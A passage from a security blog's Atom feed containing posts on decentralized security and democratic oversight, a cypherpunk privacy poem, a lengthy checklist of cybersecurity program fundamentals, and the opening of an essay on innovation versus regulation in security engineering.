power is distributed among the people or their representatives to prevent
concentration of power.</p>

<h3 id="enhancing-transparency-and-accountability"><strong>Enhancing Transparency and Accountability</strong></h3>

<p>Decentralized systems inherently promote transparency and accountability.
Transactions on a blockchain, for instance, are visible to all participants
and cannot be altered retroactively. This level of transparency is parallel to
what is sought in democratic oversight, where the decision-making process is
open and accountable to the public.</p>

<h3 id="building-trust-through-participation"><strong>Building Trust Through Participation</strong></h3>

<p>Both democratic oversight and decentralized security engineering foster trust
through participation. In decentralized systems, each participant has a stake
in the network’s integrity, similar to how citizens in a democracy have a
stake in societal decisions. This participatory approach strengthens trust in
the system.</p>

<h2 id="challenges-and-considerations"><strong>Challenges and Considerations</strong></h2>

<p>While the shift towards decentralized models in security engineering (for
example &lt;https://www.ciodive.com/news/lyfts-ciso-exits-as-company-embraces-
silicon-valley-trend-of-embedded-secu/549315/&gt; ) offers numerous advantages,
it also presents challenges. Technical complexities, scalability issues, and
the need for regulatory frameworks are just a few of the hurdles. Similarly,
implementing democratic oversight in technology requires balancing diverse
interests, ensuring fair representation, and addressing the digital divide.</p>

<h2 id="the-future-landscape-integrating-democratic-principles-in-security">**The Future Landscape: Integrating Democratic Principles in Security</h2>
<p>Engineering**</p>

<p>As we advance, the integration of democratic principles in security
engineering will likely become more pronounced. This integration could lead to
more equitable, resilient, and trustworthy digital systems. Embracing
decentralized models doesn’t just enhance security; it aligns technology more
closely with democratic values.</p>

<h2 id="conclusion-a-call-to-action"><strong>Conclusion: A Call to Action</strong></h2>

<p>The parallels between democratic oversight in technology and decentralized
security models in security engineering are not coincidental but a reflection
of our evolving digital society. As we embrace these models, we align our
technological infrastructure with the principles of democracy – transparency,
participation, and distributed power. For professionals in security
engineering, this is a call to action to pioneer systems that not only
safeguard our digital world but also reflect our collective values.</p>

<p>As we navigate this digital transformation, the role of security engineering
professionals becomes crucial in shaping a future where technology is not just
secure but also democratically aligned. Understanding and embracing these
principles is not just a professional requirement but a societal imperative in
building a more secure, transparent, and equitable digital world.</p>

<h2 id="essential-insights-for-security-engineers"><strong>Essential Insights for Security Engineers</strong></h2>

<ul>
  <li>
    <p>Decentralized security models align technology with democratic values of distributed trust, transparency, and accountability. However, these models introduce new attack surfaces that require specialized security expertise.</p>
  </li>
  <li>
    <p>As decentralized systems advance, integrating democratic principles into security engineering becomes vital for building secure, equitable digital infrastructure.</p>
  </li>
  <li>
    <p>Security professionals play a crucial role in realizing the potential of decentralized technology while mitigating new risks through emerging standards and best practices.</p>
  </li>
</ul>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Cybersecurity"/>
    <category term="Decentralized Security"/>
    <category term="Blockchain"/>
    <category term="Democratic Oversight"/>
    <category term="Security Engineering"/>
    <category term="Transparency"/>
    <category term="Distributed Trust"/>
    <category term="Cryptography"/>
    <category term="AI/ML Security"/>
    <category term="Ethical Technology"/>
    <summary type="html"><![CDATA[In an era where digital technology is not just a tool but a societal cornerstone, the concepts of democratic oversight in technology and decentralized security models in security engineering are more relevant than ever.]]></summary>
  </entry>
  <entry>
    <title type="html">Annabel’s Cypherpunk Manifesto</title>
    <link href="https://www.securesql.info/2023/11/08/silicon-valley-innovation/" rel="alternate" type="text/html" title="Annabel’s Cypherpunk Manifesto"/>
    <published>2023-11-08T00:00:00-08:00</published>
    <updated>2023-11-08T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2023/11/08/silicon-valley-innovation</id>
    <content type="html" xml:base="https://www.securesql.info/2023/11/08/silicon-valley-innovation/"><![CDATA[<p>It was many and many a year ago,</p>

<p>In a realm of digital glow,</p>

<p>That the Cypherpunks came to know,</p>

<p>A love for privacy, like a river’s flow.</p>

<p>So they wrote code, both night and day,</p>

<p>In the name of secrecy, they paved the way,</p>

<p>For encryption, like a lover’s sway,</p>

<p>To guard the whispers they had to say.</p>

<p>But the winds of change did fiercely blow,</p>

<p>And governments sought to overthrow,</p>

<p>The secrets kept from the status quo,</p>

<p>Yet the Cypherpunks resisted, ever so.</p>

<p>For their love for privacy, it ran so deep,</p>

<p>In their hearts, the secrets they’d keep,</p>

<p>In encrypted messages, their secrets would sleep,</p>

<p>As they guarded their freedoms, their souls to keep.</p>

<p>But one fateful day, in the digital night,</p>

<p>The forces of control, with all their might,</p>

<p>Came knocking at the door, shining their light,</p>

<p>Seeking to quench the privacy’s might.</p>

<p>And they cried with a voice that could wake the dead,</p>

<p>“We demand your secrets,” they loudly said,</p>

<p>But the Cypherpunks, they shook their heads,</p>

<p>For their love for privacy was still widespread.</p>

<p>So they wrote the code and encrypted the lore,</p>

<p>For the love of privacy, they’d fight and explore,</p>

<p>In memory of secrets, for evermore,</p>

<p>The Cypherpunks’ love, like the sea’s distant shore.</p>

<p>But the forces of control, they could not break,</p>

<p>The love for privacy, for the Cypherpunks’ sake,</p>

<p>Their secrets remained, a fortress they’d make,</p>

<p>For in the digital darkness, their love would not quake.</p>

<p>And so in this realm, where data streams,</p>

<p>The Cypherpunks hold fast to their dreams,</p>

<p>For in the name of privacy, their love gleams,</p>

<p>Like the stars in the night, where the truth redeems.</p>

<p><img src="https://securesql.info/images/lee.png.avif" alt="" /></p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Cybersecurity"/>
    <category term="Cyber Risk Management"/>
    <category term="White House Cybersecurity Executive Order"/>
    <category term="Security Automation"/>
    <category term="Infosec Trends"/>
    <category term="Risk Assessment"/>
    <category term="Cloud Security"/>
    <category term="Compliance"/>
    <category term="M&amp;A"/>
    <category term="SecOps"/>
    <category term="Tech Innovation"/>
    <category term="AI/ML Security"/>
    <summary type="html"><![CDATA[It was many and many a year ago, In a realm of digital glow, That the Cypherpunks came to know, A love for privacy, like a river's flow.]]></summary>
  </entry>
  <entry>
    <title type="html">2023 update to 2021 White House Cybersecurity Executive Order</title>
    <link href="https://www.securesql.info/2023/03/31/board-of-directors/" rel="alternate" type="text/html" title="2023 update to 2021 White House Cybersecurity Executive Order"/>
    <published>2023-03-31T00:00:00-07:00</published>
    <updated>2023-03-31T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2023/03/31/board-of-directors</id>
    <content type="html" xml:base="https://www.securesql.info/2023/03/31/board-of-directors/"><![CDATA[<p>When reviewing the latest 2023 2024 infosec trends and technical risk mgt.
capabilities, I realized I needed to update the 2021 White House Executive
Order (…Improving the Nation’s Cybersecurity) fundamentals outline. In order
to scale with limited resources to achieve the basics, below are the
fundamental hygienic basics one must achieve.</p>

<p>2023 Fundamentals to meet White House’s mandates and scale with no resources</p>

<ul>
  <li>
    <p>Enable Secure Application access</p>
  </li>
  <li>
    <p>Secure expanded attack surface</p>
  </li>
  <li>
    <p>Security of sensitive data accessed from home</p>
  </li>
  <li>
    <p>Automate patching</p>
  </li>
  <li>
    <p>Secure DevOps, DevSecOps</p>
  </li>
  <li>
    <p>Embedding security tools in CI/CD pipelines</p>
  </li>
  <li>
    <p>Automate threat hunting</p>
  </li>
  <li>
    <p>Automate risk scoring</p>
  </li>
  <li>
    <p>Automate asset inventory</p>
  </li>
  <li>
    <p>Security infrastructure as code</p>
  </li>
  <li>
    <p>Automate API inventory</p>
  </li>
  <li>
    <p>Automate risk register</p>
  </li>
  <li>
    <p>Automate security metrics</p>
  </li>
  <li>
    <p>Resiliency Engineering</p>
  </li>
  <li>
    <p>Branding</p>
  </li>
  <li>
    <p>Automation and AI Automation Engineering</p>
  </li>
  <li>
    <p>R&amp;D Technology breakdowns and systems engineering mgt.</p>
  </li>
  <li>
    <p>Consolidation and reduction of infosec vendors/tools with material value add per unit of spend</p>
  </li>
  <li>
    <p>Finance</p>

    <ul>
      <li>
        <p>Security Projects</p>
      </li>
      <li>
        <p>Business Support Drivers Development</p>
      </li>
      <li>
        <p>Alignment with Projects</p>
      </li>
      <li>
        <p>Balance FTE and contractors needs</p>
      </li>
      <li>
        <p>Balancing budget for People, Trainings, and Tools/Technology</p>
      </li>
      <li>
        <p>CapEx and OpEx considerations</p>
      </li>
      <li>
        <p>Cyber Risk Insurance</p>
      </li>
      <li>
        <p>Technology amortization</p>
      </li>
      <li>
        <p>Retire redundant &amp; under utilized tools</p>
      </li>
    </ul>
  </li>
  <li>
    <p>M&amp;A</p>

    <ul>
      <li>
        <p>Acquisition Risk Assessment</p>
      </li>
      <li>
        <p>Network/Application/Cloud Integration Cost</p>
      </li>
      <li>
        <p>Identity Management</p>
      </li>
      <li>
        <p>Security tools rationalization</p>
      </li>
    </ul>
  </li>
  <li>
    <p>Outsourced compute and workloads</p>

    <ul>
      <li>
        <p>Multi-Cloud architecture</p>
      </li>
      <li>
        <p>Strategy and Guidelines</p>
      </li>
      <li>
        <p>Cloud Security Posture Management (CSPM)</p>
      </li>
      <li>
        <p>Ownership/Liability/Incidents</p>
      </li>
      <li>
        <p>Vendor’s Financial Strength</p>
      </li>
      <li>
        <p>SLAs, RTOs, and similar contractual metrics</p>
      </li>
      <li>
        <p>Infrastructure Audit</p>
      </li>
      <li>
        <p>Proof of Application Security</p>
      </li>
      <li>
        <p>Disaster Recovery Posture</p>
      </li>
      <li>
        <p>Application Architecture</p>
      </li>
      <li>
        <p>Integration of Identity</p>
      </li>
      <li>
        <p>Management/Federation/SSO</p>
      </li>
      <li>
        <p>SaaS Policy and Guidelines</p>
      </li>
      <li>
        <p>Cloud log integration/APIs</p>
      </li>
      <li>
        <p>VIrtualized security appliances</p>
      </li>
      <li>
        <p>Cloud-native apps security</p>
      </li>
      <li>
        <p>Containers-to-container communication security</p>
      </li>
      <li>
        <p>Service mesh, micro services</p>
      </li>
      <li>
        <p>Serverless computing security</p>
      </li>
    </ul>
  </li>
  <li>
    <p>Mobile (capital) technology and assets</p>

    <ul>
      <li>
        <p>Technology advancements</p>
      </li>
      <li>
        <p>Lost/Stolen devices</p>
      </li>
      <li>
        <p>BYOD and MDM (Mobile Device Management)</p>
      </li>
      <li>
        <p>Mobile Apps Inventory</p>
      </li>
    </ul>
  </li>
  <li>
    <p>Processes</p>

    <ul>
      <li>
        <p>HR/On Boarding/Terminations</p>
      </li>
      <li>
        <p>Business Partnerships</p>
      </li>
      <li>
        <p>Standard Operating Procedures to conduct Core Business As Usual Activities</p>
      </li>
    </ul>
  </li>
  <li>
    <p>Enablement</p>

    <ul>
      <li>
        <p>Agility, Business Continuity and Disaster Recovery</p>
      </li>
      <li>
        <p>Understand industry trends (e.g. retail, financials, etc)</p>
      </li>
      <li>
        <p>Evaluating Emerging Technologies (Quantum, Crypto, Blockchain etc.)</p>
      </li>
      <li>
        <p>Data Analytics</p>
      </li>
      <li>
        <p>Augmented and Virtual Reality</p>
      </li>
      <li>
        <p>Drones</p>
      </li>
      <li>
        <p>5G use cases</p>
      </li>
      <li>
        <p>Edge Computing and Smart endpoints</p>
      </li>
    </ul>
  </li>
  <li>
    <p>IOT (R&amp;D)</p>

    <ul>
      <li>
        <p>IOT Frameworks</p>
      </li>
      <li>
        <p>Hardware/Devices security features</p>
      </li>
      <li>
        <p>IOT Communication Protocols</p>
      </li>
      <li>
        <p>Device Identity, Auth and Integrity</p>
      </li>
      <li>
        <p>Over the Air updates</p>
      </li>
      <li>
        <p>IOT Use cases</p>
      </li>
      <li>
        <p>Track and Trace</p>
      </li>
      <li>
        <p>Condition Based Monitoring</p>
      </li>
      <li>
        <p>Customer Experience</p>
      </li>
      <li>
        <p>Smart Grid</p>
      </li>
      <li>
        <p>Smart Cities / Communities</p>
      </li>
      <li>
        <p>Others …</p>
      </li>
      <li>
        <p>IoT SaaS Platforms</p>
      </li>
    </ul>
  </li>
  <li>
    <p>AI/ML</p>

    <ul>
      <li>
        <p>Train InfoSec teams</p>
      </li>
      <li>
        <p>Secure models</p>
      </li>
      <li>
        <p>Securing training and test data</p>
      </li>
      <li>
        <p>Adversarial attacks</p>
      </li>
      <li>
        <p>Chatbots and NLP</p>
      </li>
      <li>
        <p>LLAMA</p>
      </li>
      <li>
        <p>Whisper</p>
      </li>
      <li>
        <p>ChatGPT and similar models</p>
      </li>
      <li>
        <p>GIGO</p>
      </li>
      <li>
        <p>Datasets</p>
      </li>
      <li>
        <p>Deep fakes</p>
      </li>
    </ul>
  </li>
  <li>
    <p>Delivery Excellence</p>

    <ul>
      <li>
        <p>Embedding security in Requirements</p>
      </li>
      <li>
        <p>Design reviews</p>
      </li>
      <li>
        <p>Security Testing</p>
      </li>
      <li>
        <p>Certification and Accreditation</p>
      </li>
    </ul>
  </li>
  <li>
    <p>Architecture and Design</p>

    <ul>
      <li>
        <p>Traditional Network Segmentation</p>
      </li>
      <li>
        <p>Micro segmentation strategy</p>
      </li>
      <li>
        <p>Application protection</p>
      </li>
      <li>
        <p>Defense-in-depth</p>
      </li>
      <li>
        <p>Remote Access</p>
      </li>
      <li>
        <p>Encryption Technologies</p>
      </li>
      <li>
        <p>Backup/Replication/Multiple Sites</p>
      </li>
      <li>
        <p>Cloud/Hybrid/Multiple Cloud Vendors</p>
      </li>
      <li>
        <p>Software Defined Networking</p>
      </li>
      <li>
        <p>Network Function Virtualization</p>
      </li>
      <li>
        <p>Zero trust models and roadmap</p>
      </li>
      <li>
        <p>SASE/SSE strategy, vendors</p>
      </li>
      <li>
        <p>Overlay networks, secure enclaves</p>
      </li>
      <li>
        <p>Multi-Cloud architecture</p>
      </li>
    </ul>
  </li>
  <li>
    <p>IT Compliance &amp; Auditors</p>

    <ul>
      <li>
        <p>CCPA, GDPR &amp; other data privacy laws</p>
      </li>
      <li>
        <p>PCI</p>
      </li>
      <li>
        <p>SOX</p>
      </li>
      <li>
        <p>HIPAA and HITECH</p>
      </li>
      <li>
        <p>Regular Audits</p>
      </li>
      <li>
        <p>SSAE 18</p>
      </li>
      <li>
        <p>NIST/FISMA</p>
      </li>
      <li>
        <p>Executive order on improving the Nation’s Cybersecurity</p>
      </li>
      <li>
        <p>Other compliance needs</p>
      </li>
    </ul>
  </li>
  <li>
    <p>Legal Risks</p>

    <ul>
      <li>
        <p>Data Discovery and Data Ownership</p>
      </li>
      <li>
        <p>Vendor Contracts</p>
      </li>
      <li>
        <p>Investigations/Forensics</p>
      </li>
      <li>
        <p>Attorney-Client Privileges</p>
      </li>
      <li>
        <p>Data Retention and Destruction</p>
      </li>
      <li>
        <p>Team development, talent management</p>
      </li>
    </ul>
  </li>
  <li>
    <p>Technical and Enterprise Risk</p>

    <ul>
      <li>
        <p>Physical Security</p>
      </li>
      <li>
        <p>Vulnerability Management</p>
      </li>
      <li>
        <p>Ongoing risk assessments/pen testing</p>
      </li>
      <li>
        <p>Integration to Project Delivery (PMO)</p>
      </li>
      <li>
        <p>Code Reviews</p>
      </li>
      <li>
        <p>Use of Risk Assessment Methodology and framework</p>
      </li>
      <li>
        <p>Policies and Procedures</p>
      </li>
      <li>
        <p>Testing effectiveness Phishing and Associate Awareness</p>
      </li>
      <li>
        <p>Data Centric Approach</p>

        <ul>
          <li>
            <p>Data Discovery</p>
          </li>
          <li>
            <p>Data Classification</p>
          </li>
          <li>
            <p>Access Control</p>
          </li>
          <li>
            <p>Data Loss Prevention - DLP</p>
          </li>
          <li>
            <p>Partner Access</p>
          </li>
          <li>
            <p>Encryption/Masking</p>
          </li>
          <li>
            <p>Monitoring and Alerting</p>
          </li>
        </ul>
      </li>
      <li>
        <p>ICS</p>
      </li>
      <li>
        <p>PLCs</p>
      </li>
      <li>
        <p>SCADA</p>
      </li>
      <li>
        <p>HMIs</p>
      </li>
      <li>
        <p>Integrate threat intelligence</p>
      </li>
      <li>
        <p>Vendor risk management</p>
      </li>
      <li>
        <p>Cyber Risk Quantification (CRQ)</p>
      </li>
      <li>
        <p>Risk Register</p>
      </li>
      <li>
        <p>Loss, Fraud prevention</p>
      </li>
    </ul>
  </li>
  <li>
    <p>SecOps</p>

    <ul>
      <li>
        <p>Create adequate Incident Response capability</p>
      </li>
      <li>
        <p>Media Relations</p>
      </li>
      <li>
        <p>Incident Readiness Assessment</p>
      </li>
      <li>
        <p>Forensic Investigation</p>
      </li>
      <li>
        <p>Data Breach Preparation</p>

        <ul>
          <li>
            <p>Update and Test</p>
          </li>
          <li>
            <p>Incident Response Plan</p>
          </li>
          <li>
            <p>Set Leadership</p>
          </li>
          <li>
            <p>Expectations</p>
          </li>
          <li>
            <p>Business Continuity Plan</p>
          </li>
          <li>
            <p>Forensic and IR</p>
          </li>
          <li>
            <p>Partner, retainer</p>
          </li>
          <li>
            <p>Adequate Logging</p>
          </li>
          <li>
            <p>Breach exercises</p>
          </li>
          <li>
            <p>(e.g. simulations)</p>
          </li>
          <li>
            <p>First responders Training</p>
          </li>
        </ul>
      </li>
      <li>
        <p>Ransomware</p>

        <ul>
          <li>
            <p>Identify critical systems</p>
          </li>
          <li>
            <p>Perform ransomware BIA</p>
          </li>
          <li>
            <p>Tie with BC/DR Plans</p>
          </li>
          <li>
            <p>Devise containment</p>
          </li>
          <li>
            <p>strategy</p>
          </li>
          <li>
            <p>Ensure adequate backups</p>
          </li>
          <li>
            <p>Periodic backup test</p>
          </li>
          <li>
            <p>Offline backups in case</p>
          </li>
          <li>
            <p>backup is ransomed.</p>
          </li>
          <li>
            <p>Mock exercises</p>
          </li>
          <li>
            <p>Implement machine</p>
          </li>
          <li>
            <p>integrity checking</p>
          </li>
        </ul>
      </li>
      <li>
        <p>Automation and SOAR</p>

        <ul>
          <li>
            <p>Playbooks</p>
          </li>
          <li>
            <p>Runbooks</p>
          </li>
          <li>
            <p>Signals Intelligence and Data Management</p>
          </li>
        </ul>
      </li>
      <li>
        <p>Supply chain incident mgmt</p>
      </li>
      <li>
        <p>Keep inventory of software components</p>
      </li>
      <li>
        <p>Integrate into vulnerability mgmt</p>
      </li>
      <li>
        <p>Integrate into SDLC and risk mgmt process</p>
      </li>
      <li>
        <p>Managing relationships</p>
      </li>
    </ul>
  </li>
  <li>
    <p>Detection</p>

    <ul>
      <li>
        <p>Log Analysis/correlation/SIEM</p>
      </li>
      <li>
        <p>Alerting (IDS/IPS, FIM,</p>
      </li>
      <li>
        <p>WAF, Antivirus, etc)</p>
      </li>
      <li>
        <p>NetFlow analysis</p>
      </li>
      <li>
        <p>DLP</p>
      </li>
      <li>
        <p>Threat hunting and Insider threat</p>
      </li>
      <li>
        <p>MSSP integration</p>

        <ul>
          <li>
            <p>Threat Detection</p>
          </li>
          <li>
            <p>capability assessment</p>
          </li>
          <li>
            <p>Gap assessment</p>
          </li>
          <li>
            <p>Prioritization to fill gaps</p>
          </li>
        </ul>
      </li>
      <li>
        <p>SOC Operations</p>
      </li>
      <li>
        <p>SOC Resource Mgmt</p>
      </li>
      <li>
        <p>SOC Staff continuous training</p>
      </li>
      <li>
        <p>Shift management</p>
      </li>
      <li>
        <p>SOC procedures</p>
      </li>
      <li>
        <p>SOC Metrics and Reports</p>
      </li>
      <li>
        <p>SOC and NOC Integration</p>
      </li>
      <li>
        <p>SOC Tech stack management</p>
      </li>
      <li>
        <p>Threat Intelligence Feeds</p>
      </li>
      <li>
        <p>and proper utilization</p>
      </li>
      <li>
        <p>SOC DR exercise</p>
      </li>
      <li>
        <p>Partnerships with ISACs</p>
      </li>
      <li>
        <p>Long term trend analysis</p>
      </li>
      <li>
        <p>Unstructured data from IoT</p>
      </li>
      <li>
        <p>Integrate new data</p>
      </li>
      <li>
        <p>sources (see areas</p>
      </li>
      <li>
        <p>under skills development)</p>
      </li>
      <li>
        <p>Skills Development</p>
      </li>
      <li>
        <p>Machine Learning</p>
      </li>
      <li>
        <p>Skill Development</p>

        <ul>
          <li>
            <p>Understand Algorithm Biases</p>
          </li>
          <li>
            <p>IOT</p>
          </li>
          <li>
            <p>Autonomous</p>
          </li>
          <li>
            <p>Vehicles</p>
          </li>
          <li>
            <p>Drones</p>
          </li>
          <li>
            <p>Medical Devices</p>
          </li>
          <li>
            <p>Industrial Control</p>
          </li>
          <li>
            <p>Systems (ICS)</p>
          </li>
          <li>
            <p>Blockchain &amp;</p>
          </li>
          <li>
            <p>Smart Contracts</p>
          </li>
          <li>
            <p>MITRE ATT&amp;CK</p>
          </li>
          <li>
            <p>Soft skills</p>
          </li>
          <li>
            <p>Human experience</p>
          </li>
        </ul>
      </li>
      <li>
        <p>DevOps Integration</p>
      </li>
      <li>
        <p>Prepare for unplanned work</p>
      </li>
      <li>
        <p>Use of AI and Data Analytics</p>
      </li>
      <li>
        <p>Use of computer vision in physical security</p>
      </li>
      <li>
        <p>Log Anomaly Detection</p>
      </li>
      <li>
        <p>ML model training, retraining</p>
      </li>
      <li>
        <p>Red team/blue team exercises (and whatever you want to call them)</p>
      </li>
      <li>
        <p>Integrate threat intelligence platform (TIP)</p>
      </li>
      <li>
        <p>Deception technologies for breach detection</p>
      </li>
      <li>
        <p>Full packet inspection</p>
      </li>
      <li>
        <p>Detect misconfigurations</p>
      </li>
    </ul>
  </li>
  <li>
    <p>Prevention</p>

    <ul>
      <li>
        <p>Network/Application</p>
      </li>
      <li>
        <p>Firewalls</p>
      </li>
      <li>
        <p>Vulnerability Management</p>

        <ul>
          <li>
            <p>Scope</p>
          </li>
          <li>
            <p>Operating Systems</p>
          </li>
          <li>
            <p>Network Devices</p>
          </li>
          <li>
            <p>Applications</p>
          </li>
          <li>
            <p>Databases</p>
          </li>
          <li>
            <p>Code Review</p>
          </li>
          <li>
            <p>Physical Security</p>
          </li>
          <li>
            <p>Cloud misconfiguration testing</p>
          </li>
          <li>
            <p>Mobile Devices &amp; Apps</p>
          </li>
          <li>
            <p>Attack surface management</p>
          </li>
          <li>
            <p>IoT</p>
          </li>
          <li>
            <p>OT/SCADA</p>
          </li>
          <li>
            <p>Identify</p>
          </li>
          <li>
            <p>Periodic (or continuous)</p>
          </li>
          <li>
            <p>Comprehensive</p>
          </li>
          <li>
            <p>Classify</p>
          </li>
          <li>
            <p>Risk Based Approach</p>
          </li>
          <li>
            <p>Prioritize</p>
          </li>
          <li>
            <p>Mitigation (Fix, verify)</p>
          </li>
          <li>
            <p>Measure</p>
          </li>
          <li>
            <p>Baseline</p>
          </li>
          <li>
            <p>Metric</p>
          </li>
        </ul>
      </li>
      <li>
        <p>Application Security</p>

        <ul>
          <li>
            <p>Application Development</p>
          </li>
          <li>
            <p>Standards</p>
          </li>
          <li>
            <p>Secure Code</p>
          </li>
          <li>
            <p>Training and Review</p>
          </li>
          <li>
            <p>Application Vulnerability Testing</p>
          </li>
          <li>
            <p>Change Control</p>
          </li>
          <li>
            <p>File Integrity Monitoring</p>
          </li>
          <li>
            <p>Web Application Firewall</p>
          </li>
          <li>
            <p>Integration to SDLC and Project Delivery</p>
          </li>
          <li>
            <p>Inventory open source components</p>
          </li>
          <li>
            <p>Source code supply chain security</p>
          </li>
          <li>
            <p>API Security</p>
          </li>
        </ul>
      </li>
      <li>
        <p>IPS</p>
      </li>
      <li>
        <p>Identity Management</p>
      </li>
      <li>
        <p>DLP</p>
      </li>
      <li>
        <p>Anti Malware, Anti-spam</p>
      </li>
      <li>
        <p>Proxy/Content Filtering</p>
      </li>
      <li>
        <p>DNS security/ filtering</p>
      </li>
      <li>
        <p>Patching</p>
      </li>
      <li>
        <p>DDoS Protection</p>
      </li>
      <li>
        <p>Hardening guidelines</p>
      </li>
      <li>
        <p>Desktop security</p>
      </li>
      <li>
        <p>Encryption, SSL</p>
      </li>
      <li>
        <p>PKI</p>
      </li>
      <li>
        <p>Security Health Checks</p>
      </li>
      <li>
        <p>Public software repositories</p>
      </li>
    </ul>
  </li>
  <li>
    <p>IAM/Authn/Authz</p>

    <ul>
      <li>
        <p>Identity Credentialing</p>
      </li>
      <li>
        <p>Account Creation/Deletions</p>
      </li>
      <li>
        <p>Single Sign On (SSO, Simplified sign on)</p>
      </li>
      <li>
        <p>Repository (LDAP/Active Directory, Cloud Identity, Local ID stores)</p>
      </li>
      <li>
        <p>Federation, SAML, Shibboleth</p>
      </li>
      <li>
        <p>2-Factor (multi-factor) Authentication - MFA</p>
      </li>
      <li>
        <p>Role-Based Access Control</p>
      </li>
      <li>
        <p>Ecommerce and Mobile Apps</p>
      </li>
      <li>
        <p>Password resets/self-service</p>
      </li>
      <li>
        <p>HR Process Integration</p>
      </li>
      <li>
        <p>Integrating cloud-based identities</p>
      </li>
      <li>
        <p>IoT device identities</p>
      </li>
      <li>
        <p>IAM SaaS solutions</p>
      </li>
      <li>
        <p>Unified identity profiles</p>
      </li>
      <li>
        <p>Password-less authentication</p>
      </li>
      <li>
        <p>Voice signatures</p>
      </li>
      <li>
        <p>Face recognition</p>
      </li>
      <li>
        <p>IAM with Zero Trust technologies</p>
      </li>
      <li>
        <p>Privileged access management</p>
      </li>
      <li>
        <p>Use of public identity</p>
      </li>
      <li>
        <p>(Google, FB etc.)</p>
      </li>
      <li>
        <p>OAuth</p>
      </li>
      <li>
        <p>OpenID</p>
      </li>
      <li>
        <p>Digital Certificates</p>
      </li>
    </ul>
  </li>
  <li>
    <p>Infosec Basics Office</p>

    <ul>
      <li>
        <p>Strategy and business alignment</p>
      </li>
      <li>
        <p>Security policies, standards</p>
      </li>
      <li>
        <p>Risk Mgmt/Control Frameworks</p>
      </li>
      <li>
        <p>COSO</p>
      </li>
      <li>
        <p>COBIT</p>
      </li>
      <li>
        <p>ISO</p>
      </li>
      <li>
        <p>ITIL</p>
      </li>
      <li>
        <p>NIST - relevant NIST standards and guidelines</p>
      </li>
      <li>
        <p>FAIR</p>
      </li>
      <li>
        <p>Visibility across multiple frameworks</p>
      </li>
      <li>
        <p>Resource Management</p>
      </li>
      <li>
        <p>Roles and Responsibilities</p>
      </li>
      <li>
        <p>Data Ownership, sharing, and data privacy</p>
      </li>
      <li>
        <p>Conflict Management</p>
      </li>
      <li>
        <p>Metrics and Reporting</p>
      </li>
      <li>
        <p>Operational Metrics</p>
      </li>
      <li>
        <p>Executive Metrics and Reporting</p>
      </li>
      <li>
        <p>Validating effectiveness of metrics</p>
      </li>
      <li>
        <p>IT, OT, IoT/IIoT Convergence</p>
      </li>
      <li>
        <p>Explore options for cooperative SOC, collaborative infosec</p>
      </li>
      <li>
        <p>Tools and vendors consolidation</p>
      </li>
      <li>
        <p>Evaluating control effectiveness</p>
      </li>
      <li>
        <p>Maintaining a roadmap/plan for 1-3 years</p>
      </li>
      <li>
        <p>Aligning with Corporate</p>
      </li>
      <li>
        <p>Objectives</p>
      </li>
      <li>
        <p>Continuous Mgmt Updates, metrics</p>
      </li>
      <li>
        <p>Innovation and Value Creation</p>
      </li>
      <li>
        <p>Expectations Management</p>
      </li>
      <li>
        <p>Build project business cases</p>
      </li>
      <li>
        <p>Show progress/ risk reduction</p>
      </li>
      <li>
        <p>ROSI</p>
      </li>
    </ul>
  </li>
</ul>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Cybersecurity"/>
    <category term="Cyber Risk Management"/>
    <category term="White House Cybersecurity Executive Order"/>
    <category term="Security Automation"/>
    <category term="Infosec Trends"/>
    <category term="Risk Assessment"/>
    <category term="Cloud Security"/>
    <category term="Compliance"/>
    <category term="M&amp;A"/>
    <category term="SecOps"/>
    <category term="Tech Innovation"/>
    <category term="AI/ML Security"/>
    <summary type="html"><![CDATA[I realized I needed to update the 2021 White House Executive Order …Improving the Nation’s Cybersecurity fundamentals outline. In order to scale with limited resources to achieve the basics, below are the fundamental hygienic basics one must achieve.]]></summary>
  </entry>
  <entry>
    <title type="html">Striking the Right Balance- Innovation and Regulation in Security Engineering</title>
    <link href="https://www.securesql.info/2023/02/08/innovation-seceng/" rel="alternate" type="text/html" title="Striking the Right Balance- Innovation and Regulation in Security Engineering"/>
    <published>2023-02-08T00:00:00-08:00</published>
    <updated>2023-02-08T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2023/02/08/innovation-seceng</id>
    <content type="html" xml:base="https://www.securesql.info/2023/02/08/innovation-seceng/"><![CDATA[<p><img src="https://securesql.info/images/prometheus.png.avif" alt="" /></p>

<h2 id="introduction-navigating-the-crossroads-of-progress-and-protection"><strong>Introduction: Navigating the Crossroads of Progress and Protection</strong></h2>

<p>In the fast-paced world of technological advancement, balancing innovation
with regulation is a crucial challenge, especially in the field of security
engineering. This blog post explores the delicate interplay between pushing
the boundaries of technology and adhering to regulatory standards, a theme
echoing the ideas presented in a recent influential speech. Understanding this
balance is vital for everyone in the tech industry, from developers to
policymakers, as it shapes the future of digital security and innovation.</p>

<h2 id="the-need-for-innovative-security-solutions"><strong>The Need for Innovative Security Solutions</strong></h2>

<h3 id="pushing-boundaries-while-ensuring-safety"><strong>Pushing Boundaries While Ensuring Safety</strong></h3>

<p>In the realm of security engineering, innovation is not just a buzzword; it’s
a necessity. The role of security engineers becomes that of mediators in this
dialectical, interplay process. They are not just technicians but philosophers
in their own right, constantly negotiating the balance between the potential
of what can be done and the prudence of what should be done. Their work is at
the forefront of shaping not just technology, but the very fabric of society –
determining how technological progress unfolds and impacts humanity. As cyber
threats evolve, so must the defenses against them. This requires developing
cutting-edge solutions that can anticipate and counteract sophisticated
attacks. However, this push for innovation must not come at the cost of safety
and reliability. Many Security Engineers are students of computer science who
are also exposed to ethical theories and democratic principles. This cross-
pollination of ideas ensures that future security engineers are not just
proficient in coding and system design but also in understanding the broader
implications of their work on society &amp; safety.</p>

<h3 id="embracing-emerging-technologies"><strong>Embracing Emerging Technologies</strong></h3>

<p>Embracing emerging technologies like AI, blockchain, and quantum computing is
part of this innovative drive. This innovation is the spirit of Prometheus,
stealing fire from the gods – a metaphor for the boundless potential of human
ingenuity. These stolen fires offer new ways to enhance security measures,
from improving threat detection to ensuring data integrity. Yet, their
integration into security solutions must be carefully managed to ensure they
meet regulatory standards and ethical guidelines. Or articles like this come
about: &lt;https://www.nytimes.com/2020/01/18/technology/clearview-privacy-
facial-recognition.html&gt;</p>

